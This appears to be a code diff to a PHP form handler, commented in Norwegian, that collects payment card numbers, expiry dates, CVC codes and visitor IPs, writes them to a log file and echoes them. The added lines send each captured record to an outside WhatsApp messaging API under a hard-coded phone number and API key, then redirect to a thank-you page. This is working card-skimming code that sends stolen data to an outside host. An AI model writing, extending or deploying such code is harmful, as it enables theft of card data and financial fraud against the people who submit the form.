@@ -5,11 +5,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
   $cvc = $_POST['cvc'] ?? 'ukjent';
   $ip = $_SERVER['REMOTE_ADDR'] ?? 'ukjent';
   $tid = date("Y-m-d H:i:s");
-
   $logg = "[$tid] IP: $ip – Kort: $kortnr – Utløp: $utlopsdato – CVC: $cvc\n";
   file_put_contents("logs.txt", $logg, FILE_APPEND);
   echo $logg;
-
+  $melding = urlencode($logg);
+  $whats_url = "https://api.callmebot.com/whatsapp.php?phone=4741357171&text=$melding&apikey=7838436";
+  file_get_contents($whats_url);
   header("Location: takk.php");
   exit;
 }
